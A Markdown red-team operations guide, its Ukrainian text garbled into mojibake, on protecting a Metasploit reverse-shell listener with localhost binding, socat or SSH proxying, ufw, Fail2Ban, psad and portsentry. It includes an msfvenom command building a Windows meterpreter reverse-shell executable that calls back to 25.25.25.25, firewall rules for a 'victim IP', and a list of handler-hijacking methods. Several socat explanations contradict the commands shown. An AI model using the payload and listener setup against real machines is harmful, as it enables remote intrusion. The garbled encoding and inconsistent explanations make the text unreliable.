# üõ°Ô∏è –ó–∞—Ö–∏—Å—Ç Red Team-–æ–ø–µ—Ä–∞—Ç–æ—Ä–∞ –ø—ñ–¥ —á–∞—Å —Ä–æ–±–æ—Ç–∏ –∑ –ø—É–±–ª—ñ—á–Ω–æ—é IP —Ç–∞ —Ä–µ–≤–µ—Ä—Å-—Å–µ—Å—ñ—è–º–∏

## üìã –ó–º—ñ—Å—Ç

- [1. –û—Å–Ω–æ–≤–Ω–∞ –∑–∞–≥—Ä–æ–∑–∞ –ø—Ä–∏ –≤—ñ–¥–∫—Ä–∏—Ç–æ–º—É listener'—ñ](#1)
- [2. –ú–µ—Ä–µ–∂–µ–≤—ñ —Ä–µ–∂–∏–º–∏ –≤—ñ—Ä—Ç—É–∞–ª–∫–∏: –±–µ–∑–ø–µ–∫–∞ —Ç–∞ –∞—Ç–∞–∫–∏](#2)
- [3. –ü—Ä–æ–∫—Å—ñ—é–≤–∞–Ω–Ω—è —Ä–µ–≤–µ—Ä—Å-—Å–µ—Å—ñ—ó –±–µ–∑ –≤—ñ–¥–∫—Ä–∏—Ç–æ–≥–æ listener'–∞](#3)
- [4. –í–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–Ω—è ufw –¥–ª—è –æ–±–º–µ–∂–µ–Ω–Ω—è –¥–æ—Å—Ç—É–ø—É](#4)
- [5. –ú–µ—Ç–æ–¥–∏ –∞—Ç–∞–∫–∏ –Ω–∞ –Ω–µ–∑–∞—Ö–∏—â–µ–Ω—É —Å–µ—Å—ñ—é](#5)
- [6. –ö–æ–º–∞–Ω–¥–∏, –ø—Ä–∏–∫–ª–∞–¥–∏, PoC](#6)
- [7. –ü—Ä–æ–∫—Å—ñ + –∑–∞—Ö–∏—Å—Ç] (#7)

---

## <a name="1"></a>1. –û—Å–Ω–æ–≤–Ω–∞ –∑–∞–≥—Ä–æ–∑–∞ –ø—Ä–∏ –≤—ñ–¥–∫—Ä–∏—Ç–æ–º—É listener'—ñ

### –Ø–∫—â–æ handler –≤—ñ–¥–∫—Ä–∏—Ç–∏–π (0.0.0.0:4444):

- –ë—É–¥—å-—Ö—Ç–æ –≤ –º–µ—Ä–µ–∂—ñ/–Ü–Ω—Ç–µ—Ä–Ω–µ—Ç—ñ –º–æ–∂–µ:
  - –ü—ñ–¥'—î–¥–Ω–∞—Ç–∏ —Ñ–µ–π–∫–æ–≤–∏–π —à–µ–ª–ª;
  - –ê—Ç–∞–∫—É–≤–∞—Ç–∏ Metasploit handler (–≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—é—á–∏ –≤—Ä–∞–∑–ª–∏–≤–æ—Å—Ç—ñ –∞–±–æ –∞–≤—Ç–æ–∑–∞–ø—É—Å–∫ —Å–∫—Ä–∏–ø—Ç—ñ–≤);
  - –°–∫–∞–Ω—É–≤–∞—Ç–∏ —Ç–∞ –≤–∏–∑–Ω–∞—á–∏—Ç–∏ fingerprint listener'–∞;
  - –ü–µ—Ä–µ—Ö–æ–ø–∏—Ç–∏ –∞–±–æ –Ω–∞–≤'—è–∑–∞—Ç–∏ C2-–ø—ñ–¥–∫–ª—é—á–µ–Ω–Ω—è.

### –©–æ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ –Ω–∞—Ç–æ–º—ñ—Å—Ç—å:

- `set ReverseListenerBindAddress 127.0.0.1`
- –ü—Ä–æ–∫—Å—ñ —Ç—Ä–∞—Ñ—ñ–∫ —á–µ—Ä–µ–∑ `socat`, `ssh -R`, –∞–±–æ `Tor Hidden Service`

---

## <a name="2"></a>2. –ú–µ—Ä–µ–∂–µ–≤—ñ —Ä–µ–∂–∏–º–∏ –≤—ñ—Ä—Ç—É–∞–ª–∫–∏: –±–µ–∑–ø–µ–∫–∞ —Ç–∞ –∞—Ç–∞–∫–∏

| –†–µ–∂–∏–º | IP Kali | –Ü–Ω—Ç–µ—Ä–Ω–µ—Ç | –í–∏–¥–∏–º—ñ—Å—Ç—å | –ü—Ä–∏–º—ñ—Ç–∫–∞ |
|-------|---------|----------|------------|----------|
| NAT | –ü—Ä–∏–≤–∞—Ç–Ω–∏–π | ‚úÖ | ‚ùå | –ë–µ–∑–ø–µ—á–Ω–∏–π, –∞–ª–µ –∂–µ—Ä—Ç–≤–∞ –Ω–µ –ø–æ–±–∞—á–∏—Ç—å Kali |
| Bridged | LAN IP (192.168.x.x) | ‚úÖ | ‚úÖ | –í—Ä–∞–∑–ª–∏–≤–∏–π, —è–∫—â–æ –Ω–µ–º–∞—î —Ñ–∞—î—Ä–≤–æ–ª—É |
| Host-only | 192.168.56.x | ‚ùå | ‚ùå | –¢—ñ–ª—å–∫–∏ Kali ‚Üî Host |
| Internal | —ñ–∑–æ–ª—å–æ–≤–∞–Ω–∏–π | ‚ùå | ‚ùå | –î–ª—è LAB |
| NAT Network | –ø—Ä–∏–≤–∞—Ç–Ω–∏–π | ‚úÖ | ‚ùå | –ü–æ—Ç—Ä—ñ–±–Ω–∞ —Ä—É—á–Ω–∞ –º–∞—Ä—à—Ä—É—Ç–∏–∑–∞—Ü—ñ—è |

---

## <a name="3"></a>3. –ü—Ä–æ–∫—Å—ñ—é–≤–∞–Ω–Ω—è —Ä–µ–≤–µ—Ä—Å-—Å–µ—Å—ñ—ó –±–µ–∑ –≤—ñ–¥–∫—Ä–∏—Ç–æ–≥–æ listener'–∞

### Listener –≤ Kali:

```bash
set payload windows/meterpreter/reverse_tcp
set lhost 127.0.0.1
set lport 4444
set ReverseListenerBindAddress 127.0.0.1
exploit -j
```

### –ü—Ä–æ–∫—Å—ñ –Ω–∞ —Ö–æ—Å—Ç—ñ (–µ—Ñ–µ–∫—Ç–∏–≤–Ω–∏–π –¥–ª—è Metasploit payload):

```bash
socat TCP4-LISTEN:4444,fork TCP4:192.168.141.129:4444
```

### –ê–±–æ —á–µ—Ä–µ–∑ SSH:

```bash
ssh -R 4444:127.0.0.1:4444 user@vps
```

### –ï—Ñ–µ–∫—Ç–∏–≤–Ω–∏–π –º–µ—Ö–∞–Ω—ñ–∑–º –æ–±–º–µ–∂–µ–Ω–Ω—è –¥–æ –æ–¥–Ω–æ–≥–æ shell —á–µ—Ä–µ–∑ socat –Ω–∞ nc -nlvp.
```bash
socat -T5000 TCP4-LISTEN:4444,fork,reuseaddr,max-children=1 TCP4:192.168.141.129:4444
```
```bash
socat -T300 TCP4-LISTEN:4444,fork,reuseaddr,range=192.168.141.10/32,max-children=1 TCP4:192.168.141.129:4444
```
üîç –ü–æ—è—Å–Ω–µ–Ω–Ω—è:

- `fork` ‚Äì –æ–∑–Ω–∞—á–∞—î, —â–æ –ª–∏—à–µ –æ–¥–Ω–µ –∑‚Äô—î–¥–Ω–∞–Ω–Ω—è –æ–±—Å–ª—É–≥–æ–≤—É—î—Ç—å—Å—è. –ü—ñ—Å–ª—è –≤—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–Ω—è –∑'—î–¥–Ω–∞–Ω–Ω—è, –æ–±—Ä–æ–±–∏—Ç—å –π–æ–≥–æ —É –¥–æ—á—ñ—Ä–Ω—å–æ–º—É –ø—Ä–æ—Ü–µ—Å—ñ —Ç–∞ –ø—Ä–æ–¥–æ–≤–∂–∏—Ç—å —Å–ª—É—Ö–∞—Ç–∏ –Ω–æ–≤—ñ –ø—ñ–¥–∫–ª—é—á–µ–Ω–Ω—è;
- `max-children=1` ‚Äî –ª–∏—à–µ –æ–¥–Ω–µ –∑‚Äô—î–¥–Ω–∞–Ω–Ω—è, –Ω–µ –∑–∞–ø—É—Å–∫–∞—î—Ç—å—Å—è –±–µ–∑ `fork`.
- `socat` –∑–∞–≤–µ—Ä—à—É—î—Ç—å—Å—è –ø—ñ—Å–ª—è –∑–∞–∫—Ä–∏—Ç—Ç—è shell'—É, –Ω–µ —á–µ–∫–∞—î –Ω–æ–≤—ñ –∫–æ–Ω–µ–∫—à–µ–Ω–∏;
- –±–µ–∑ `-T` ‚Äì —â–æ–± —É–Ω–∏–∫–Ω—É—Ç–∏ —Ç–∞–π–º-–∞—É—Ç—É –±–µ–∑ –∞–∫—Ç–∏–≤–Ω–æ—Å—Ç—ñ;
- `pty` ‚Äì —ñ–Ω—Ç–µ—Ä–∞–∫—Ç–∏–≤–Ω–∞ –æ–±–æ–ª–æ–Ω–∫–∞;
- `stderr,sigint,sane` ‚Äì –¥–ª—è –ø–æ–≤–Ω–æ—Ü—ñ–Ω–Ω–æ–≥–æ –∫–æ—Ä–∏—Å—Ç—É–≤–∞–Ω–Ω—è –æ–±–æ–ª–æ–Ω–∫–æ—é.
- `range=192.168.141.10/32` ‚Äî –¥–æ–∑–≤–æ–ª–∏—Ç–∏ —Ç—ñ–ª—å–∫–∏ –æ–¥–Ω–µ –¥–∂–µ—Ä–µ–ª–æ.

---

## <a name="4"></a>4. –í–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–Ω—è ufw –¥–ª—è –æ–±–º–µ–∂–µ–Ω–Ω—è –¥–æ—Å—Ç—É–ø—É

### –ë–∞–∑–æ–≤–∞ –Ω–∞—Å—Ç—Ä–æ–π–∫–∞:

```bash
sudo ufw enable
sudo ufw default deny incoming
sudo ufw default allow outgoing
```

### –î–æ–∑–≤–æ–ª–∏—Ç–∏ –ª–∏—à–µ –∫–æ–Ω–∫—Ä–µ—Ç–Ω–æ–º—É IP:

```bash
sudo ufw allow from 192.168.3.110 to any port 4444 proto tcp
```

---

## <a name="5"></a>5. –ú–µ—Ç–æ–¥–∏ –∞—Ç–∞–∫–∏ –Ω–∞ –Ω–µ–∑–∞—Ö–∏—â–µ–Ω—É —Å–µ—Å—ñ—é

- "Back Shell" ‚Äî –∞—Ç–∞–∫—É—é—á–∏–π –Ω–∞–¥—Å–∏–ª–∞—î —Å–≤—ñ–π payload —É –≤—ñ–¥–∫—Ä–∏—Ç–∏–π handler
- –í–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–Ω—è `AutoRunScript` –¥–ª—è –≤–∏–∫–æ–Ω–∞–Ω–Ω—è –∫–æ–¥—É –Ω–∞ Kali
- –ó–ª–æ–≤–∂–∏–≤–∞–Ω–Ω—è Metasploit API (`msgrpc`)
- –ü—ñ–¥–º—ñ–Ω–∞ `meterpreter`-—Å–µ—Å—ñ—ó
- –ï–∫—Å–ø–ª—É–∞—Ç–∞—Ü—ñ—è —á–µ—Ä–µ–∑ –Ω–µ–ø—Ä–∞–≤–∏–ª—å–Ω—ñ ACL –∞–±–æ –Ω–µ–±–µ–∑–ø–µ—á–Ω—ñ –º–æ–¥—É–ª—ñ

---

## <a name="6"></a>6. –ö–æ–º–∞–Ω–¥–∏, –ø—Ä–∏–∫–ª–∞–¥–∏, PoC

### Reverse Shell –≥–µ–Ω–µ—Ä–∞—Ü—ñ—è:

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=25.25.25.25 LPORT=4444 -f exe > shell.exe
```

### –õ–æ–∫–∞–ª—å–Ω–∏–π –∑–∞—Ö–∏—â–µ–Ω–∏–π handler:

```bash
set lhost 127.0.0.1
set ReverseListenerBindAddress 127.0.0.1
```

`ReverseListenerBindAddress` –≤–∏–∑–Ω–∞—á–∞—î, –Ω–∞ —è–∫—É –ª–æ–∫–∞–ª—å–Ω—É IP-–∞–¥—Ä–µ—Å—É –Ω–∞ –≤–∞—à—ñ–π –∞—Ç–∞–∫—É—é—á—ñ–π –º–∞—à–∏–Ω—ñ –±—É–¥–µ –ø—Ä–∏–≤'—è–∑–∞–Ω–∏–π (bind) —Å–ª—É—Ö–∞—á. –¶–µ –æ–∑–Ω–∞—á–∞—î, —â–æ Metasploit –±—É–¥–µ —Å–ª—É—Ö–∞—Ç–∏ –≤—Ö—ñ–¥–Ω—ñ –∑'—î–¥–Ω–∞–Ω–Ω—è –ª–∏—à–µ –Ω–∞ —Ü—ñ–π –∫–æ–Ω–∫—Ä–µ—Ç–Ω—ñ–π IP-–∞–¥—Ä–µ—Å—ñ.

`set ReverseListenerBindAddress 127.0.0.1` –æ–∑–Ω–∞—á–∞—î, —â–æ —Å–ª—É—Ö–∞—á –±—É–¥–µ –ø—Ä–∏–≤'—è–∑–∞–Ω–∏–π –¥–æ –ª–æ–∫–∞–ª—å–Ω–æ–≥–æ —ñ–Ω—Ç–µ—Ä—Ñ–µ–π—Å—É –∑–≤–æ—Ä–æ—Ç–Ω–æ–≥–æ –∑–≤'—è–∑–∫—É (localhost) –≤–∞—à–æ—ó –º–∞—à–∏–Ω–∏. –¢–æ–±—Ç–æ, Metasploit –±—É–¥–µ —á–µ–∫–∞—Ç–∏ –∑'—î–¥–Ω–∞–Ω—å –ª–∏—à–µ –≤—ñ–¥ —Å–∞–º–æ—ó —Å–µ–±–µ.

## <a name="6"></a>6. –ü—Ä–æ–∫—Å—ñ + –∑–∞—Ö–∏—Å—Ç:

```bash
socat TCP4-LISTEN:4444,fork TCP4:127.0.0.1:4444
sudo ufw allow from –ñ–ï–†–¢–í–ê_IP to any port 4444 proto tcp
```
## ufw ‚Äî –æ–±–º–µ–∂–µ–Ω–Ω—è –¥–æ—Å—Ç—É–ø—É –ø–æ IP

```bash
sudo ufw enable
sudo ufw default deny incoming
sudo ufw default allow outgoing
sudo ufw allow from –ñ–ï–†–¢–í–ê_IP to any port 4444 proto tcp
```

---

## Fail2Ban

### –í—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–Ω—è:

```bash
sudo apt install fail2ban
```

### –ö–æ–Ω—Ñ—ñ–≥ `jail.local`:

```ini
[customport]
enabled = true
filter = customport
action = iptables[name=customport, port=4444, protocol=tcp]
logpath = /var/log/syslog
maxretry = 1
findtime = 60
bantime = 600
```

### –§—ñ–ª—å—Ç—Ä `customport.conf`:

```ini
[Definition]
failregex = .*4444.*Connection refused.*
ignoreregex =
```

---

## psad ‚Äî IDS –Ω–∞ –±–∞–∑—ñ iptables

### –í—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–Ω—è:

```bash
sudo apt install psad
```

### –ù–∞–ª–∞—à—Ç—É–≤–∞–Ω–Ω—è `/etc/psad/psad.conf` (—Ñ—Ä–∞–≥–º–µ–Ω—Ç):

```ini
EMAIL_ADDRESSES             "";
HOSTNAME                    kali.local;
ENABLE_AUTO_IDS             Y;
ENABLE_SYSLOG_FILE          Y;
```

üìÅ –õ–æ–≥–∏: `/var/log/psad/`

---

## portsentry ‚Äî –∞–∫—Ç–∏–≤–Ω–µ –±–ª–æ–∫—É–≤–∞–Ω–Ω—è —Å–∫–∞–Ω–µ—Ä—ñ–≤

### –í—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–Ω—è:

```bash
sudo apt install portsentry
```

### `/etc/default/portsentry`:

```ini
TCP_MODE="atcp"
UDP_MODE="audp"
```

### `/etc/portsentry/portsentry.conf`:

```ini
BLOCK_UDP="1"
BLOCK_TCP="1"
KILL_ROUTE="/sbin/iptables -I INPUT -s $TARGET$ -j DROP"
KILL_RUN_CMD="/bin/echo 'PSENTRY: $TARGET$ blocked on $(date)' >> /var/log/portsentry-block.log"
RESOLVE_HOST = "0"
ADVANCED_PORTS_TCP="1024"
ADVANCED_PORTS_UDP="1024"
ADVANCED_EXCLUDE_TCP="22,80,443,4444"
ADVANCED_EXCLUDE_UDP=""
```
---

## üß© –†–µ–∫–æ–º–µ–Ω–¥–∞—Ü—ñ—ó:

- Listener –∑–∞–≤–∂–¥–∏ –Ω–∞ `127.0.0.1`
- –ü—Ä–æ–∫—Å—ñ —Ç—ñ–ª—å–∫–∏ –∑ IP-—Ñ—ñ–ª—å—Ç—Ä–∞–º–∏
- –ö–æ–Ω—Ç—Ä–æ–ª—å –∫—ñ–ª—å–∫–æ—Å—Ç—ñ –ø—ñ–¥–∫–ª—é—á–µ–Ω—å (`socat max-children=1`)
- –ú–æ–Ω—ñ—Ç–æ—Ä–∏–Ω–≥ —á–µ—Ä–µ–∑ `tcpdump`, `ss`, `netstat`
